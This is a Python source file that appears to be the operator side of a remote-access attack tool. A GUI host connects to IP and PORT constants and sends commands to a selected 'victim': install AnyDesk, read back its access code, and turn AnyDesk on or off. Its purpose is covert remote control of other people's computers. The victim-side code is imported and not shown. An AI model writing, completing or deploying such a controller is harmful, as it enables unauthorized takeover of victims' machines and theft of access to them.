from time import sleep
from constants import *
from os.path import dirname, abspath
from classes.host_gui import HostWithGUI

hostWithGUI = None


def startButtonOnClick(command, selectedVictim):
    """
    Called when the start button is clicked

    param 1: the command to executes
    param 2: the victim to executing the command on

    param 1 type: str
    param 2 type: Victim
    """

    processCommand(command, selectedVictim)


def processCommand(command, selectedVictim):
    """
    Processes and executes the command


    param 1: the command to executes
    param 2: the victim to executing the command on

    param 1 type: str
    param 2 type: Victim
    """

    if command == INSTALL_ANYDESK_COMMAND:
        code = selectedVictim.initialize()
        hostWithGUI.showInfo(
            "Anydesk code", f"The anydesk code for this victim is {code}")

    elif command == GET_CODE_COMMAND:
        code = selectedVictim.getCode()
        hostWithGUI.showInfo(
            "Anydesk code", f"The anydesk code for this victim is {code}")

    elif command == POWER_ON_ANYDESK_COMMAND:
        selectedVictim.powerOnAnydesk()
        hostWithGUI.showInfo(
            "ANYDESK STATE", f"Anydesk has been sucessfully powered on!")

    elif command == POWER_OFF_ANYDESK_COMMAND:
        selectedVictim.powerOffAnydesk()
        hostWithGUI.showInfo(
            "ANYDESK STATE", f"Anydesk has been sucessfully powered off!")


def main():
    global hostWithGUI

    hostWithGUI = HostWithGUI(IP, PORT, [INSTALL_ANYDESK_COMMAND, GET_CODE_COMMAND,
                                         POWER_ON_ANYDESK_COMMAND, POWER_OFF_ANYDESK_COMMAND], startButtonOnClick)
    hostWithGUI.buildGUI()


if __name__ == "__main__":
    main()
